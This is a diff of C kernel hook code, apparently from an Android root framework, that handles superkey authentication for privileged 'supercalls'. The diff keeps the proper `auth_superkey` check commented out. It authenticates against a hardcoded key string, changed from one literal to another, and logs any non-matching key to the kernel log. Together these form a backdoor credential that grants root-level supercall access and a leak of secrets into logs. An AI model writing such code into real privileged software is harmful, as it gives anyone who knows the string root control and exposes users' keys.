@@ -515,35 +515,34 @@ static void before(hook_fargs6_t *args, void *udata)
 {
     const char *__user ukey = (const char *__user)syscall_argn(args, 0);
     long ver_xx_cmd = (long)syscall_argn(args, 1);
-
     // todo: from 0.10.5
     // uint32_t ver = (ver_xx_cmd & 0xFFFFFFFF00000000ul) >> 32;
     // long xx = (ver_xx_cmd & 0xFFFF0000) >> 16;
-
-    
-
     char key[MAX_KEY_LEN];
     long len = compat_strncpy_from_user(key, ukey, MAX_KEY_LEN);
     if (len <= 0) return;
-
+    
     int is_key_auth = 0;
     int is_trusted_manager = 0;
     is_trusted_manager = is_trusted_manager_uid(current_uid());
     if (is_trusted_manager) {
         is_key_auth = 1;
     }
-    pr_info("superkey: %s\n",key);
+    
     // if (!auth_superkey(key)) {
-    if (!strcmp("yybnb123",key)) {
+    if (!strcmp("liznb123",key)) {
         is_key_auth = 1;
     } else if (!strcmp("su", key)) {
         uid_t uid = current_uid();
         if (!is_su_allow_uid(uid) && !is_trusted_manager) return;
     } else {
+        pr_info("not equal superkey: %s\n",key);
         if (!is_trusted_manager) return;
     }
+
     long cmd = ver_xx_cmd & 0xFFFF;
     if (cmd < SUPERCALL_HELLO || cmd > SUPERCALL_MAX) return;
+
     long a1 = (long)syscall_argn(args, 2);
     long a2 = (long)syscall_argn(args, 3);
     long a3 = (long)syscall_argn(args, 4);
